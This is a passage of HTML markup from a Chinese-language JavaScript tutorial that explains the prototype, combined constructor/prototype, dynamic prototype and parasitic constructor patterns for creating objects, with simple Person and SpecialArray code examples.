rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在此，我们将<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法和所有的属性直接添加在了<span style=\"color: rgb(0, 128, 255);\">Person</span>的<span style=\"color: rgb(0, 128, 255);\">prototype</span>属性中，构造函数变成了空函数。即便如此，我们仍然可以通过构造函数来创建新对象，而且新对象还会具有相同的属性和方法。但是与构造函数不同的是，新对象的这些属性和方法是由所有实例共享的。换句话说，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>访问的都是同一组属性和同一个<span style=\"color: rgb(0, 128, 255);\">sayName()</span>函数。要理解原型模式的工作原理，就必须先理解ECMAScript中原型对象的性质。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型对象的本性由于篇幅太长将会在下一章节详细分析。上面我们说了原型模式的好处，接下来我们来看一下原型模式的缺点。原型模式省略了为构造函数传递参数的这一环节，结果所有实例在默认情况下都具有相同的属性值。这会在某些程度上带来一种不便，这并不是原型模式最大的问题，因为如果我们想为一个通过原型模式创建的对象添加属性时，添加的这个属性就会屏蔽原型对象的保存的同名属性。换句话说，就是添加的这个属性会阻止我们去访问原型中的属性，但并不会改变原型中的属性。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型模式最大的问题是由其共享的本质所导致的。原型中所有的属性被很多实例共享，这种共享对函数非常合适，对包含基本值的属性也说的过去，但是对引用类型的属性值来说问题就比较突出了，下面我们来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\">function</span> Person(){<br>}<br>Person.prototype = { &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">constructor</span>:Person, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">name</span>:<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">age</span>:<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">friends</span>:[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>], &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">sayName</span>:<span class=\"\" style=\"box-sizing: border-box;\">function</span>(){<br> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br>person1.friends.push(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>);<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">true</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子中，<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>对象有一个名为<span style=\"color: rgb(0, 128, 255);\">friends</span>的属性，该属性包含一个字符串数组。然后创建了两个<span style=\"color: rgb(0, 128, 255);\">Person</span>的实例，接着修改<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>引用的数组，向数组中添加一个字符串，由于数组存在于<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>中而不是<span style=\"color: rgb(0, 128, 255);\">person1</span>中，所以<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>也会被修改。但是一般每个对象都是要有属于自己的属性的，所以我们很少看到有人单独使用原型模式来创建对象。</p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p></section></section><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>四、组合使用构造函数模式和原型模式</strong></span><span style=\"color: rgb(136, 136, 136);\"></span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义类型最常见的方式就是组合使用构造函数模式与原型模式。构造函数模式用于定义实例属性，原型模式用于定义方法和共享的属性。结果，每个实例都会有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度的节省了内存。另外，这种混成模式还支持向构造函数传递参数；可谓是集两种模式之长。下面的代码重写了前面的例子：</span></p></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">function Person(name, age){ &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>];</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">Person.prototype = { &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;constructor</span>:Person, &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;sayName</span>:function(){</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“bu”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">25</span>);</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">false</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.sayName === person2.sayName); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，实例属性都是在构造函数中定义的，而由所有实例共享的属性<span style=\"color: rgb(0, 128, 255);\">constructor</span>和方法<span style=\"color: rgb(0, 128, 255);\">sayName()</span>则是在原型中定义的。所以修改了<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>并不会改变<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>，因为他们分别引用了不同的数组。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种构造函数与原型模式混成的模式，是目前在ECMAScript中使用最广泛、认同度最高的一种创建自定义类型的方法。可以说，这是用来定义引用的一种默认形式。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>五、动态原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有其他OO语言经验的开发人员在看到独立的构造函数和原型时，很可能会感到非常的困惑。动态原型模式就是用来解决这个问题的一个方案，它把所有的信息都封装在了构造函数中，而通过构造函数中初始化原型（仅在必要的情况下），又保持了同时使用构造函数和原型的优点。换句话说，可以通过检查某个应该存在的方法是否有效，来决定是否要初始化原型。来看一个例子：</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>]; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//注意if语句</span></span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">if</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">typeof</span> <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.sayName!=<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“function”</span>){<br>&nbsp;&nbsp;&nbsp;&nbsp;Person.prototype.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{ <br>&nbsp;&nbsp;&nbsp;&nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>);<br>person1.sayName();</span></code></pre></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意构造函数代码中的if语句，这里只在<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法不存在的情况下才会将它添加到原型中。这断代码只有在第一次调用构造函数的时候才会被执行。此后，原型已经被初始化，不需要再做什么修改。不过要记住，这里所做的修改能立即在所有实例中得到反映。因此，这种方法可以说确实非常完美。其中if语句检查的是初始化之后应该存在的任何方法和属性–不必再用一大堆if来检查每个属性和方法，只检查其中一个即可。对于采用这样模式创建的对象，还可以使用<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符来确定他的类型。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：使用动态原型模式时，不能使用对象字面量重写原型。如果在已经创建了实例的情况下重写原型，那么就会切断现有的实例与新原型之间的联系。</strong></span><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><strong><span style=\"color: rgb(247, 92, 47);\">六、寄生构造函数模式</span></strong></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在上述几种模式都不适合的情况下可以使用寄生构造函数模式。这种模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象，但从表面看，这个函数又很像典型的构造函数。来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br>&nbsp; o.name = name;<br>&nbsp; o.age = age;<br> &nbsp; &nbsp;<br>&nbsp; o.job = job;<br> &nbsp; &nbsp;<br>&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br>&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;} &nbsp; &nbsp;<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"> &nbsp; &nbsp; &nbsp;return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“banzhuan”</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//“wei”</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person</span>函数创建了一个对象，并以相应的属性和方法初始化该对象，然后返回了这个对象。除了使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符把使用的包装函数叫做构造函数之外，这个模式和工厂模式并没有多大的区别。构造函数在不返回值的情况下，会默认返回新对象的实例。而通过在构造函数的末尾添加一个<span style=\"color: rgb(0, 128, 255);\">return</span>语句，可以重写调用构造函数时返回的值。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个模式可以在特殊的情况下来为对象创建构造函数。假设我们想创建一个具有额外方法的特殊数组。由于不能直接修改Array构造函数，因此可以使用这个模式：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">SpecialArray</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"><br> &nbsp; &nbsp;//创建数组</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br> &nbsp; &nbsp;var</span> values = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Array</span>(); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加值</span><br> &nbsp; &nbsp;values.push.apply(values,<span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">arguments</span>); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加方法</span><br> &nbsp; &nbsp;values.toPipedString = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br> &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.join(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“|”</span>);<br>} &nbsp; &nbsp;<br> <br> <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">&nbsp; &nbsp;//返回数组</span><br> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp;return</span> values;<br> }<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> colors = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> SpecialArray(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“red”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“blue”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“green”</span>);<br>console.log(colors.toPipedString());<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//red|blue|green</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，我们创建了一个名为<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>的构造函数。在这个函数的内部，首先创建了一个数组，然后<span style=\"color: rgb(0, 128, 255);\">push()</span>方法初始化了数组的值。随后又给数组实例添加了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法，用来返回以竖线分隔的数组值。最后将数组以函数的形式返回。接着，我们调用了<span style=\"color: rgb(0, 128, 